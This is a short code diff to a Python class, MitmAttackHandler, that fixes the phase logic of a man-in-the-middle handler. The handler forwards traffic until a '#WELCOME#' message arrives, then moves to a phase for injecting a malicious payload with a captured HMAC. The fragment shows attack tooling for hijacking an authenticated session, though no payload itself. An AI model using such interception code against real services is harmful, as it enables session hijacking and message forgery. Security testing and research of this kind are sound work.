@@ -233,13 +233,7 @@ class MitmAttackHandler:
         # After reconnect, forward challenges normally until we see WELCOME
         elif (self.global_state.state['active'] and 
               self.global_state.state['phase'] == 'waiting_reconnect'):
-            # Forward all messages normally until we see WELCOME
-            return True
-                
-        # Detect WELCOME message to transition to payload injection phase
-        elif (self.global_state.state['active'] and 
-              self.global_state.state['phase'] == 'waiting_reconnect' and
-              isinstance(raw_msg, (bytes, str))):
+            # Check if this is a WELCOME message
             welcome_detected = False
             if isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
                 welcome_detected = True
@@ -255,7 +249,10 @@ class MitmAttackHandler:
                 # Transition to payload injection phase
                 self.global_state.state['phase'] = 'ready_for_injection'
                 return True  # Forward the WELCOME message
-            
+            else:
+                # Forward all other messages normally until we see WELCOME
+                return True
+                
         # After handshake, inject malicious payload with captured HMAC
         elif (self.global_state.state['active'] and 
               self.global_state.state['phase'] == 'ready_for_injection'):
